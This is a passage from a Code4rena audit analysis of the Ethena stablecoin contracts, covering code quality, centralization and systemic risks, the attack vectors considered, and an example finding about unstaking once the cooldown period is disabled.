    - The user initially had assets worth \$20,000 (10 stETH). If they hadn't engaged with Ethena and simply held onto their 10 stETH, their assets would now be worth \$30,000 due to the positive market movement.
    - By choosing to use Ethena's hedging mechanism, they've forfeited potential gains to safeguard against potential losses. They receive approximately 6.67 stETH (worth \$20,000) back after the redemption process, missing out on the additional \$10,000 value increase.
    - Essentially, the user's assets remained stable in USDe value, but they did not benefit from ETH's bullish market. Their asset value didn’t decrease, but they also lost potential profit

## 2. Codebase Quality Analysis

1. **`USDe.sol`**:

   - Code Organization:
     - The contract is well-organized and follows the best practices for code layout and structure.
     - It uses OpenZeppelin contracts, which are widely recognized and audited.
     - The constructor initializes the contract and sets the owner/admin.
     - It provides functions to set the minter and mint USDe tokens.

   - Modifiers:
     - The contract uses the `Ownable2Step` modifier, which enforces two-step ownership transfer.
     - The `onlyRole` modifier is used to restrict certain functions to specific roles, enhancing security.

   - Minting:
     - The contract allows only the minter to mint new tokens, which is a good security measure.
     - It checks if the provided minter is valid.

   - Gas Efficiency:
     - The contract uses the SafeERC20 library for safe token transfers, ensuring protection against reentrancy attacks.
     - Gas-efficient practices are followed throughout the contract.

   - Overall, `USDe.sol` appears to be well-structured and follows best practices for security and code organization.

2. **`EthenaMinting.sol`**:

   - Code Organization:
     - It imports external libraries and contracts, including OpenZeppelin contracts.
     - The constructor initializes contract parameters and roles.
     - It contains functions for minting and redeeming USDe tokens.

   - Security Measures:
     - The contract enforces access control using role-based access control (RBAC) with different roles for minters, redeemers, and gatekeepers.
     - Gas limits for minting and redeeming are enforced to prevent abuse.

   - Signature Verification:
     - It verifies the signature of orders, ensuring that the orders are signed by authorized parties.
     - It uses EIP-712 for signature verification.

   - Gas Efficiency:
     - Gas-efficient practices are followed, and SafeERC20 is used for token transfers.

   - Domain Separator:
     - The contract computes the domain separator for EIP-712, enhancing security.

   - Deduplication:
     - The contract implements deduplication of taker orders to prevent replay attacks.

   - Supported Assets:
     - The contract maintains a list of supported assets.

   - Custodian Addresses:
     - It keeps track of custodian addresses and allows transfers to custodian wallets.

   - Overall, `EthenaMinting.sol` is well-structured, secure, and follows best practices for code organization and security.

3. **`StakedUSDe.sol:`**

  The contract inherits **Implementation of the ERC4626 "Tokenized Vault Standard" from OZ**

- Code Organization:
  - It imports external libraries and contracts, including OpenZeppelin contracts.
  - The constructor initializes contract parameters and roles.
  - It contains functions for transferring rewards, managing the blacklist, rescuing tokens, and redistributing locked amounts.
  - Public functions are provided to query the total assets and unvested amounts.
  - The `decimals` function is overridden to return the number of decimal places.
  - Custom modifiers ensure input validation and role-based access control.
  - Hooks and functions are in place to enforce restrictions on specific roles and token transfers.

4.  **`StakedUSDeV2.sol:`**

- Code Organization:
  - The contract extends `StakedUSDe` and inherits its code organization structure.
  - It introduces additional state variables, including `cooldowns`, `silo`, `MAX_COOLDOWN_DURATION`, and `cooldownDuration`.
  - Custom modifiers, `ensureCooldownOff` and `ensureCooldownOn`, are defined to control the execution of functions based on cooldown status.
  - The constructor initializes the contract and sets the cooldown duration.
  - External functions are provided for withdrawing, redeeming, and performing cooldown actions for assets and shares.
  - The contract enforces different behavior based on the cooldown duration, adhering to or breaking the ERC4626 standard.
  - The `setCooldownDuration` function allows the admin to update the cooldown duration.

5. **`USDeSilo.sol:`**

  - The contract is primary goal of `USDeSilo.sol` is to to `hold the funds` for the `cooldown period` whn user initiate `unstaking`. 

  **General Observations:**<br>
   - Role-based access control is implemented for various functions, enhancing security.
   - Gas-efficient practices, such as using SafeERC20, are followed throughout the code.
   - The codebase of protocol includes comprehensive comments and region divisions for clarity.
   - Note that, The use of EIP-712 for signature verification adds an extra layer of security.

6. **`SingleAdminAccessControl.sol:`**
    
  - EthenaMinting uses SingleAdminAccessControl rather than the standard AccessControl.

In summary, the Ethena Protocol's codebase appears to be of high quality, with a strong focus on security and code organization.

## 3. Centralization Risks
Actually, the `Ethena` Protocol contains many roles, each with quite a few abilities. This is necessary for the Protocol's logic and purpose.

The protocol assigns important roles like "MINTER," "REWARDER," and "ADMIN" to specific entities, potentially exposing the system to undue influence or risks if these roles are compromised.

So, these roles introduce several **centralization risks**. The most significant one is the scenario in which the **`MINTER` role becomes compromised**. An attacker/minter could then `mint a billion USDe` without collateral and dump them into pools, causing a black swan event that our insurance fund cannot cover.

However, `Ethena` **addresses this problem** by enforcing on-chain **mint and redeem limitations of 100k USDe** per block."

From the documentation:
> Our solution is to enforce an on chain mint and redeem limitation of 100k USDe per block. In addition, we have `GATEKEEPER` roles with the ability to disable mint/redeems and remove `MINTERS`,`REDEEMERS`. `GATEKEEPERS` acts as a safety layer in case of compromised `MINTER`/`REDEEMER`. They will be run in seperate AWS accounts not tied to our organisation, constantly checking each transaction on chain and disable mint/redeems on detecting transactions at prices not in line with the market. In case compromised `MINTERS` or `REDEEMERS` after this security implementation, a hacker can at most mint 100k USDe for no collateral, and redeem all the collateral within the contract (we will hold ~\$200k max), for a max loss of \$300k in a single block, before `GATEKEEPER` disable mint and redeem. The \$300k loss will not materialy affect our operations.

In summary, `Ethena` actually introduces several centralization risks due to the presence of many different roles in the Protocol. **However, at the same time, the team has done its best to enforce measures that reduce the largest potential attack scenario to a maximum loss of \$300k, which will not materially affect the `Ethena` operations/ecosystem.**

## 4. Systemic Risks
Here’s an analysis of potential systemic

1. Smart Contract Vulnerability Risk:
Smart contracts can contain `vulnerabilities` that can be exploited by attackers. If a smart contract has `critical security flaws`, such as logic problems, this could lead to asset loss or `system manipulation`. I strongly recommend that, once the protocol is audited, necessary actions be taken to `mitigate any issues` identified by `C4 Wardens`

2. Third-Party Dependency Risk:
Contracts rely on external data sources, such as `@openzeppelin/contracts-upgradeable`, and there is a risk that if any `issues` are found with these `dependencies` in your contracts, the `Ethena` protocol could also be affected.

I observed that `old versions` of `OpenZeppelin` are used in the project, and these should be updated to the latest version:

```
  "name": "@openzeppelin/contracts-upgradeable",
  "description": "Secure Smart Contract library for Solidity",
  "version": "4.9.2",
```

The latest version is `4.9.3` (as of July 28, 2023), while the project uses version `4.9.2`.

## 5. Attack Vectors Discussed During the Audit
1. Issues related to Roles (Centralization Risks). Problems with roles changing.
2. Breaking of Main Protocol Invariants
    - EthenaMinting.sol - User's signed EIP712 order, if executed, must always execute as signed. ie for mint orders, USDe is minted to user and collateral asset is removed from user based on the signed values.
    - Max mint per block should never be exceeded.
    - USDe.sol - Only the defined minter address can have the ability to mint USDe.
3. DoS for important protocol functions/flows such as `EtehnaMinting.sol#mint()` (Minting Flow), `EtehnaMinting.sol#redeem()` (Redemption Flow), `StakedUSDe#deposit()/StakedUSDe#_deposit()` (Depositing Flow), `StakedUSDeV2#unstake()` (Unstaking Flow). 
4. Token transfer fails.
5. Minting more than 100k USDe per block.
6. Users cannot unstake/withdraw/redeem.
7. Can users withdraw more than they actually are supposed to?
8. Minting without providing collateral amount?

## 6. Example Report

Example of report that turned out to be invalid after I wrote a `really good Explanation and PoC`. The report explain the `unstaking` really well, so you can learn for it.

### Title: Users will not be able to `withdraw/redeem` their assets/shares from `StackedUSDeV2` contract. (Inefficient logic)

### Explanation
[`StakedUSDeV2.sol`](https://github.com/code-423n4/2023-10-ethena/blob/main/contracts/StakedUSDeV2.sol) is where holders of `USDe` stablecoin can stake their stablecoin, get `stUSDe` in return and `earn yield`. The Etehna Protocol yield is paid out by having a `REWARDER` role of the staking contract send yield in `USDe`, increasing the `stUSDe` value with respect to `USDe`. This contract is a modification of the `ERC4626 standard`, with a change to vest in rewards linearly over 8 hours

When the `unstake` process is initiated, from the user's perspective, `stUSDe` is burnt immediately, and they will be able to invoke the [`withdraw()`](https://github.com/code-423n4/2023-10-ethena/blob/main/contracts/StakedUSDeV2.sol#L52-L60) function after `cooldown` is up to get their `USDe` in return. Behind the scenes, on `burning of stUSDe`, `USDe` is sent to a seperate [USDeSilo](https://github.com/code-423n4/2023-10-ethena/blob/main/contracts/USDeSilo.sol) contract to hold the funds for the `cooldown period`. And on `withdrawal`, the staking contract moves user funds from `USDeSilo` contract out to the `user's address`.

1. Functions respond for `redemption`, `starting of cooldown` and `transferring of converted underlying asset to USSDeSilo contract` are [cooldownAssets() and cooldownShares()](https://github.com/code-423n4/2023-10-ethena/blob/main/contracts/StakedUSDeV2.sol#L95-L122)

```js
  function cooldownAssets(uint256 assets, address owner) external ensureCooldownOn returns (uint256) {
    if (assets > maxWithdraw(owner)) revert ExcessiveWithdrawAmount();

    uint256 shares = previewWithdraw(assets);

    cooldowns[owner].cooldownEnd = uint104(block.timestamp) + cooldownDuration;
    cooldowns[owner].underlyingAmount += assets;

    _withdraw(_msgSender(), address(silo), owner, assets, shares);

    return shares;
  }

  /// @notice redeem shares into assets and starts a cooldown to claim the converted underlying asset
  /// @param shares shares to redeem
  /// @param owner address to redeem and start cooldown, owner must allowed caller to perform this action
  function cooldownShares(uint256 shares, address owner) external ensureCooldownOn returns (uint256) {
    if (shares > maxRedeem(owner)) revert ExcessiveRedeemAmount();

    uint256 assets = previewRedeem(shares);

    cooldowns[owner].cooldownEnd = uint104(block.timestamp) + cooldownDuration;
    cooldowns[owner].underlyingAmount += assets;

    _withdraw(_msgSender(), address(silo), owner, assets, shares);

    return assets;
  }
```

2. After `cooldown` is finished, user can call [`unstake()`](https://github.com/code-423n4/2023-10-ethena/blob/main/contracts/StakedUSDeV2.sol#L78-L90) to `claim the staking amount after`.

```js
  function unstake(address receiver) external {
    UserCooldown storage userCooldown = cooldowns[msg.sender];
    uint256 assets = userCooldown.underlyingAmount;

    if (block.timestamp >= userCooldown.cooldownEnd) {
      userCooldown.cooldownEnd = 0;
      userCooldown.underlyingAmount = 0;

      silo.withdraw(receiver, assets);
    } else {
      revert InvalidCooldown();
    }
  }
```
*The function check if the cooldown is finished by `block.timestamp >= userCooldown.cooldownEnd` check.*<br>
*REMEMBER: The assets are transferred from `USDeSilo` contract -> https://github.com/code-423n4/2023-10-ethena/blob/main/contracts/USDeSilo.sol#L28-L30*

Described logic above works only if the cooldown is set to number greater than zero. (aka the cooldown is active)

The `Ethena` can decide to `disable the cooldown period`, so the users to be able `unstake without cooldown period`. If this is done, the user will be able to call directly [`withdraw()/redeem()`](https://github.com/code-423n4/2023-10-ethena/blob/main/contracts/StakedUSDeV2.sol#L52-L73) to unstake:

```js
  function withdraw(uint256 assets, address receiver, address owner)
    public
    virtual
    override
    ensureCooldownOff
    returns (uint256)
  {
    return super.withdraw(assets, receiver, owner);
  }

  /**
   * @dev See {IERC4626-redeem}.
   */
  function redeem(uint256 shares, address receiver, address owner)
    public
    virtual
    override
    ensureCooldownOff
    returns (uint256)
  {
    return super.redeem(shares, receiver, owner);
  }
```
*REMEMBER: The assets are transferred from `StakedUSDeV2` contract -> https://github.com/code-423n4/2023-10-ethena/blob/main/contracts/USDeSilo.sol#L28-L30*


### Proof of Concept
So, the problem in Ethena protocol logic aries exactly when `Ethena` decide to `disable the cooldown period`.

Let's illustrate the following example:

**Scenario**

- Cooldown Period: 50 days

1. Alice deposit her 10000 `USDe` tokens in `StakedUSDeV2` contract.
2. Bob also deposit his 20000 `USDe` tokens in `StakedUSDeV2` contract.
3. After some time Bob decide to unstake and call `cooldownAssets()` to start of cooldown period and converted underlying asset are transferred to `USSDeSilo` contract and he redeem his 20000 `USDe` tokens.
4. After 30 days `Ethena` disable cooldown period.
5. Now users are supposed to unstake directly from `withdraw()/redeem()`.
6. But when the Bob tries to call `withdraw()/redeem()` he will not be able to get his converted underlying asset, because they are in `USDeSilo` contract.
7. Alice call `withdraw()/redeem()` and get his converted underlying asset.

After all, I observed that users who have already called `cooldownAssets()/cooldownShares()` can call the `unstake()` function again to retrieve their converted underlying asset.

**[FJ-Riveros (Ethena) acknowledged](https://github.com/code-423n4/2023-10-ethena-findings/issues/460#issuecomment-1804562701)**



***


# Disclosures

C4 is an open organization governed by participants in the community.

C4 Audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
